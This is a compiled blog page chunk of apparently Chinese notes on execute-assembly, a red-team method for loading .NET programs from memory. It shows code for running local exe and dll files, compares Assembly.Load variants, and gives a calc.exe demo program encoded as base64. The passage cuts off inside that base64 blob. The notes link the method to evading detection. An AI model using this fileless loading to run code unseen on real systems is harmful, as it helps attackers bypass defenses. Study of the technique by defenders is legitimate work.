import{_ as o}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c,a as s,d as a,e as p,b as e,o as l,r as i}from"./app-CGtPVU7B.js";const A="/DailyNotes/assets/image-20220114182430780-16443915545351-D_Jwmbvt.png",u="/DailyNotes/assets/image-20220114182256752-DDTLvS2K.png",r="/DailyNotes/assets/image-20220209135538841-DfPCLxpX.png",k="/DailyNotes/assets/image-20220117192352767-CLbJZ5tW.png",d="/DailyNotes/assets/image-20241210102855805-D8myHGh2.png",v={},m={href:"https://github.com/echo0d/DailyCode/tree/main/ExecuteAssembly",target:"_blank",rel:"noopener noreferrer"},b={href:"https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization",target:"_blank",rel:"noopener noreferrer"},g={href:"https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90",target:"_blank",rel:"noopener noreferrer"},y={href:"https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.5",target:"_blank",rel:"noopener noreferrer"},f={href:"https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface",target:"_blank",rel:"noopener noreferrer"},h={href:"https://0pen1.github.io/2022/02/09/net%E7%A8%8B%E5%BA%8F%E9%9B%86%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF/",target:"_blank",rel:"noopener noreferrer"},w={href:"https://learn.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-executeindefaultappdomain-method",target:"_blank",rel:"noopener noreferrer"},I={href:"https://github.com/med0x2e/ExecuteAssembly",target:"_blank",rel:"noopener noreferrer"};function R(L,n){const t=i("ExternalLinkIcon");return l(),c("div",null,[n[15]||(n[15]=s("h1",{id:"execute-assembly实现方法",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#execute-assembly实现方法"},[s("span",null,"Execute-Assembly实现方法")])],-1)),s("p",null,[n[1]||(n[1]=a("文档里的代码都")),s("a",m,[n[0]||(n[0]=a("DailyCode/PEExecute at main · echo0d/DailyCode")),p(t)])]),s("blockquote",null,[n[3]||(n[3]=s("ul",null,[s("li",null,"执行本地exe"),s("li",null,[a("从内存中加载.NET程序集 "),s("ul",null,[s("li",null,"C#"),s("li",null,"C++")])])],-1)),s("p",null,[s("a",b,[n[2]||(n[2]=a("Execute-Assembly实现 | idiotc4t's blog")),p(t)])])]),n[16]||(n[16]=e(`<h2 id="_0-执行本地文件" tabindex="-1"><a class="header-anchor" href="#_0-执行本地文件"><span>0. 执行本地文件</span></a></h2><p>此处以C# C++ Java为例：AI都会写</p><h3 id="exe" tabindex="-1"><a class="header-anchor" href="#exe"><span>exe</span></a></h3><p>在C#中执行一个<code>.exe</code>文件可以使用<code>Process</code>类，</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Program</span>
<span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        Process<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token string">&quot;C:\\\\file.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>而在C++中可以使用<code>CreateProcess</code>函数。</p><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    STARTUPINFO si<span class="token punctuation">;</span>
    PROCESS_INFORMATION pi<span class="token punctuation">;</span>

    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    si<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ZeroMemory</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pi<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Start the child process.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CreateProcess</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">&quot;C:\\\\file.exe&quot;</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>si<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;CreateProcess failed (%d).\\n&quot;</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Wait until child process exits.</span>
    <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Close process and thread handles.</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Java</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exeExecute</span><span class="token punctuation">(</span><span class="token class-name">String</span> filePath<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 创建进程</span>
            <span class="token class-name">ProcessBuilder</span> processBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            processBuilder<span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 合并错误流</span>
            <span class="token class-name">Process</span> process <span class="token operator">=</span> processBuilder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// 等待进程结束</span>
            <span class="token keyword">int</span> exitCode <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Exited with code: &quot;</span> <span class="token operator">+</span> exitCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="dll" tabindex="-1"><a class="header-anchor" href="#dll"><span>dll</span></a></h3><p>在C#中执行一个<code>.dll</code>文件通常涉及在应用程序中加载并调用该<code>.dll</code>中的函数。</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Program</span>
<span class="token punctuation">{</span>
    <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">DllImport</span><span class="token attribute-arguments"><span class="token punctuation">(</span><span class="token string">&quot;C:\\\\dll_file.dll&quot;</span><span class="token punctuation">)</span></span></span><span class="token punctuation">]</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">extern</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">YourFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 假设要调用的函数没有返回值</span>

    <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">YourFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用从DLL中导入的函数</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在C++中执行一个<code>.dll</code>文件通常是通过加载动态链接库并调用其中的函数。</p><div class="language-cpp line-numbers-mode" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>YourFunction<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 假设要调用的函数没有返回值</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    HINSTANCE hDLL <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">&quot;C:\\\\dll_file.dll&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hDLL <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        YourFunction yourFunction <span class="token operator">=</span> <span class="token punctuation">(</span>YourFunction<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hDLL<span class="token punctuation">,</span> <span class="token string">&quot;YourFunction&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>yourFunction <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">yourFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用从DLL中导入的函数</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token comment">// 处理函数加载失败的情况</span>
        <span class="token punctuation">}</span>
        <span class="token function">FreeLibrary</span><span class="token punctuation">(</span>hDLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// 处理DLL加载失败的情况</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Java调用第三方dll有点困难，需要dll的源码中实现了JNI方法，此处就不写了。</p><h2 id="_1-managed代码内存加载-net程序集" tabindex="-1"><a class="header-anchor" href="#_1-managed代码内存加载-net程序集"><span>1. managed代码内存加载.NET程序集</span></a></h2><p><strong>(Assembly.Load)</strong></p><p>使用C#从内存中加载.NET程序集，直接用<code>Assembly.Load</code>就行了。</p>`,18)),s("blockquote",null,[s("p",null,[s("a",g,[n[4]||(n[4]=a("从内存加载.NET程序集(Assembly.Load)的利用分析")),p(t)])]),s("p",null,[s("a",y,[n[5]||(n[5]=a("Assembly.Load Method (System.Reflection) | Microsoft Learn")),p(t)])])]),n[17]||(n[17]=e(`<h3 id="_1-1-三种load的区别" tabindex="-1"><a class="header-anchor" href="#_1-1-三种load的区别"><span>1.1. 三种Load的区别</span></a></h3><p><strong><code>Assembly.Load()</code>、<code>Assembly.LoadFrom()</code>和<code>Assembly.LoadFile()</code></strong></p><ul><li><p><code>Assembly.Load()</code>是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘</p></li><li><p><code>Assembly.LoadFrom()</code>从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFrom(&quot;a.dll&quot;)</code>，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll</p></li><li><p><code>Assembly.LoadFile()</code>也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集，例如：<code>Assembly.LoadFile(&quot;a.dll&quot;)</code>，如果a.dll中引用了b.dll，那么不会加载b.dll</p></li></ul><h3 id="_1-2-c-反射加载流程" tabindex="-1"><a class="header-anchor" href="#_1-2-c-反射加载流程"><span>1.2. C#反射加载流程</span></a></h3><p>测试程序的代码如下：</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
<span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
	<span class="token punctuation">{</span>
    		<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    		<span class="token punctuation">{</span>
        		Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">&quot;Main&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">aaa</span>
	<span class="token punctuation">{</span>
    		<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">bbb</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    		<span class="token punctuation">{</span>
        		<span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        		p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">&quot;c:\\\\windows\\\\system32\\\\calc.exe&quot;</span><span class="token punctuation">;</span>
        		p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用csc.exe进行编译：</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:testcalc.exe test.cs
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>生成testcalc.exe</p><h4 id="方法1" tabindex="-1"><a class="header-anchor" href="#方法1"><span>方法1</span></a></h4><p><strong>（1）测试的.exe作base64编码</strong></p><p>代码如下：</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>

            <span class="token class-name"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> buffer <span class="token operator">=</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>File<span class="token punctuation">.</span><span class="token function">ReadAllBytes</span><span class="token punctuation">(</span><span class="token string">&quot;testcalc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToBase64String</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>base64str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>（2）还原.exe的内容</strong></p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Reflection</span><span class="token punctuation">;</span>
<span class="token keyword">namespace</span> <span class="token namespace">TestApplication</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>

            <span class="token class-name"><span class="token keyword">string</span></span> base64str <span class="token operator">=</span> <span class="token string">&quot;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BTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAB0AGUAcwB0AGMAYQBsAGMALgBlAHgAZQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoquot;</span><span class="token punctuation">;</span>
